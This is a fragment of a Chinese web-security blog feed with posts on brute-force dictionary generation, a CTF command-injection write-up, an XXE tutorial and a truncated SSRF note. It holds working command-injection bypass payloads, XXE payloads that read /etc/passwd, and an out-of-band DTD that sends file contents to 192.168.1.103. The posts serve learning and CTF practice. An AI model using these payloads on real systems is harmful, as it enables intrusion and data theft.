srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210224816896"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http走私攻击 </tag>
            
            <tag> php字符串解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于暴力破解和字典生成的一些操作</title>
      <link href="2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
      <url>2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>一些些关于爆破和制作字典的方法</p><span id="more"></span><h3 id="暴力破解basic认证-本质是在爆破用户名密码的base64编码"><a href="#暴力破解basic认证-本质是在爆破用户名密码的base64编码" class="headerlink" title="暴力破解basic认证(本质是在爆破用户名密码的base64编码)"></a>暴力破解basic认证(本质是在爆破用户名密码的base64编码)</h3><h4 id="HTTP-Basic-认证介绍"><a href="#HTTP-Basic-认证介绍" class="headerlink" title="HTTP Basic 认证介绍"></a>HTTP Basic 认证介绍</h4><p>基本认证 basic authentication 是 HTTP1.0 提出的认证方法</p><p>认证步骤：</p><ol><li><p>客户端访问一个受http基本认证保护的资源。</p></li><li><p>服务器返回401，要求客户端提供用户名和密码进行认证</p><p>401 Unauthorized</p><p>WWW-Authenticate: Basic realm=”WallyWorld”</p></li><li><p>客户端将输入的用户名密码用base64进行编码后，采用非加密的明文方式传送个服务器。</p><p>Authorization: Basic xxxxxxxx</p></li><li><p>如果认证成功，则返回相关的资源。如果认证失败，则返回401状态，要求重新认证</p></li></ol><h4 id="爆破方法"><a href="#爆破方法" class="headerlink" title="爆破方法"></a>爆破方法</h4><p> :label:利用burp的Intruder模块即可，爆破方案用Runtime即可</p><p><img src="/2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/image-20210209154758836.png" class="lazyload" data-srcset="/2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/image-20210209154758836.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210209154758836"></p><p>:label: 利用python代码生成一个符合basic模式的字典 :arrow_right:admin:password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rdfile</span>(<span class="params">one_file</span>):</span></span><br><span class="line">    cttlist=[]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(one_file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        cttlist=f.readlines()</span><br><span class="line">    <span class="keyword">return</span> cttlist</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">concet_two_list</span>(<span class="params">list1,list2</span>):</span></span><br><span class="line">    result_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">            result_list.append(i.strip()+<span class="string">&#x27;:&#x27;</span>+j)</span><br><span class="line">    <span class="keyword">return</span> result_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_into_file</span>(<span class="params">onelist</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.writelines(onelist)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    list1=rdfile(<span class="string">&#x27;./username.txt&#x27;</span>)</span><br><span class="line">    list2=rdfile(<span class="string">&#x27;./password.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(list2)</span><br><span class="line">    list3=concet_two_list(list1,list2)</span><br><span class="line">    write_into_file(list3)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="利用工具自制字典"><a href="#利用工具自制字典" class="headerlink" title="利用工具自制字典"></a>利用工具自制字典</h3><h4 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -i #根据姓名 生日 等信息生成字典</span><br><span class="line">python3 cupp.py -w #根据现有字典拓展字典</span><br><span class="line">python3 cupp.py -l #下载字典</span><br></pre></td></tr></table></figure><h4 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h4><p>:label: 一款非常强大的字典生成工具</p><p>具体使用见 readme</p><h4 id="dymerge"><a href="#dymerge" class="headerlink" title="dymerge"></a>dymerge</h4><p>:label: Dymerge 用来操作多个已获得的字典文件，重塑以及合并的工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Dymerge删除重复项</span><br><span class="line">python3 dymerge.py dic1.txt dic2.txt -u</span><br><span class="line">Dymerge 拆开字典</span><br><span class="line">python3 dymerge.py dic1.txt dic2.txt -r</span><br><span class="line">Dymerge 字母和数字排序</span><br><span class="line">python3 dymerge.py dic1.txt dict2.txt -s</span><br><span class="line">Dymerge 输出合并内容</span><br><span class="line">python3 dymerge.py dic1.txt dict2.txt -s -t -o /root/output.txt</span><br><span class="line">Dymerge 定义为压缩文件输出</span><br><span class="line">python3 dymerge.py dic1.txt dic2.txt -z /root/output.zip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴破 </tag>
            
            <tag> 字典制作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GXYCTF2019]Ping Ping Ping</title>
      <link href="2021/02/06/GXYCTF2019-Ping-Ping-Ping/"/>
      <url>2021/02/06/GXYCTF2019-Ping-Ping-Ping/</url>
      
        <content type="html"><![CDATA[<p>一道非常经典的命令执行绕过题</p><span id="more"></span><h3 id="测试回显"><a href="#测试回显" class="headerlink" title="测试回显"></a>测试回显</h3><p><img src="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206005922078.png" class="lazyload" data-srcset="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206005922078.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206005922078"></p><p>分号或者管道符拼接执行命令</p><blockquote><p><code>?ip=127.0.0.1|ls</code></p><p><code>?ip=127.0.0.1;ls</code></p></blockquote><p><img src="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010234137.png" class="lazyload" data-srcset="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010234137.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206010234137"></p><p><code>?ip=127.0.0.1|cat index.php</code>尝试读一下源码</p><p><img src="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010333734.png" class="lazyload" data-srcset="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010333734.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206010333734"></p><h4 id="bypass空格过滤"><a href="#bypass空格过滤" class="headerlink" title="bypass空格过滤"></a>bypass空格过滤</h4><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure></blockquote><p>测试只有 $IFS$1可以</p><p>读出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="bypass-bash"><a href="#bypass-bash" class="headerlink" title="bypass bash"></a>bypass bash</h4><p>我们可以通过 sh来执行想要的命令</p><h4 id="bypass-flag"><a href="#bypass-flag" class="headerlink" title="bypass flag"></a>bypass flag</h4><blockquote><p>统配符号绕过符号绕过 ? *</p><p>fla’’g</p><p>fla\g.php</p><p>a=g;fla$a 变量拼接</p><p>echo “Y2F0IGZsYWcucGhw”| base64 -d | bash 编码解码</p><p>内联执行 反引号内命令的输出作为输入执行 </p></blockquote><p>因为<code>if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))</code> 和上面过滤了通配符的原因</p><p>所以只能采取变量拼接和编码的方式</p><h4 id="bypass-cat"><a href="#bypass-cat" class="headerlink" title="bypass cat"></a>bypass cat</h4><blockquote><p>tac </p><p>ca\t</p><p>通配符 c?t</p><p>编码如上 </p></blockquote><h3 id="三种payload"><a href="#三种payload" class="headerlink" title="三种payload"></a>三种payload</h3><p>结合上述源代码和bypass技巧，得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip=17.0.0.1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html#commentform">https://www.cnblogs.com/wangtanzhi/p/12246386.html#commentform</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析XXE漏洞攻防</title>
      <link href="2021/02/05/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/"/>
      <url>2021/02/05/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<p>系统学习了XXE漏洞的原理，以及XML语法 XXE漏洞利用代码的编写</p><span id="more"></span><h3 id="XML代码用途和语法"><a href="#XML代码用途和语法" class="headerlink" title="XML代码用途和语法"></a>XML代码用途和语法</h3><blockquote><p>XML被设计者用来传输和储存数据。XML文档形成了一种树状结构，它从”根部”开始，扩展到”枝叶”。XML允许创作这定义自己的标签和自己的文档结构</p></blockquote><h4 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h4><blockquote><ul><li>所以的XML元素都必须有一个关闭标签</li><li>XML标签对大小写敏感</li><li>XML必须正确嵌套</li><li>XML属性值必须加引号</li><li>实体引用</li><li>在XML中，空格会被保留</li></ul></blockquote><h4 id="XML-DTD介绍"><a href="#XML-DTD介绍" class="headerlink" title="XML DTD介绍"></a>XML DTD介绍</h4><blockquote><p>拥有正确语法的XML被称为”形式良好”的XML。通过DTD验证的XML是”合法”的XML。</p></blockquote><p>DTD本身相当于给出了一套格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span>(<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;-- PCDATA 的意思是被解析的字符数据parsed character data，一种数据类型 --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>&lt; -- CDATA 的意思是字符数据，是不会被解析的文本 --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">message</span>&gt;</span>Don&#x27;t forget me this weekind!<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD可以位于XML源文件内部，也可以位于XML源文件的外部，即如下两种格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename.dtd&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE root-element [element-declarations]&gt;</span><br></pre></td></tr></table></figure><h4 id="DTD-实体介绍"><a href="#DTD-实体介绍" class="headerlink" title="DTD 实体介绍"></a>DTD 实体介绍</h4><blockquote><p>实体是用于定义引用普通文本和特殊字符的快捷方式的变量</p></blockquote><ul><li>内部实体：<code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</code></li><li>外部实体：<code>&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;</code>&gt;</li></ul><h3 id="XXE注入漏洞原理"><a href="#XXE注入漏洞原理" class="headerlink" title="XXE注入漏洞原理"></a>XXE注入漏洞原理</h3><blockquote><p>XXE外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，没有禁止外部实体加载，可能导致加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、内网攻击、dos攻击等危害</p></blockquote><p>xxe漏洞触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致恶意上传xml文件</p><h4 id="漏洞代码demo"><a href="#漏洞代码demo" class="headerlink" title="漏洞代码demo"></a>漏洞代码demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$xml</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$data</span>=simplexml_load_string(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XXE漏洞利用我"><a href="#XXE漏洞利用我" class="headerlink" title="XXE漏洞利用我"></a>XXE漏洞利用我</h3><h4 id="有回显任意文件读取"><a href="#有回显任意文件读取" class="headerlink" title="有回显任意文件读取"></a>有回显任意文件读取</h4><p>上面已经给出读取代码，这里给出一种读取php源代码的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=test.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="无回显文件读取"><a href="#无回显文件读取" class="headerlink" title="无回显文件读取"></a>无回显文件读取</h4><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.1.103/test.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;e1;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;! ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;! ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#39;http:&#x2F;&#x2F;192.168.1.103&#x2F;test.php?con&#x3D;%p1;&#39;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SSRF漏洞的学习笔记</title>
      <link href="2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>未完待续</p><span id="more"></span><h3 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><p><img src="/2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210205132744574.png" class="lazyload" data-srcset="/2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210205132744574.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210205132744574"></p><h3 id="三种产生此漏洞的php函数dome"><a href="#三种产生此漏洞的php函数dome" class="headerlink" title="三种产生此漏洞的php函数dome"></a>三种产生此漏洞的php函数dome</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$content</span>=file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&quot;./images/&quot;</span>.rand().<span class="string">&#x27;imag1.jpg&#x27;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$img</span> =<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 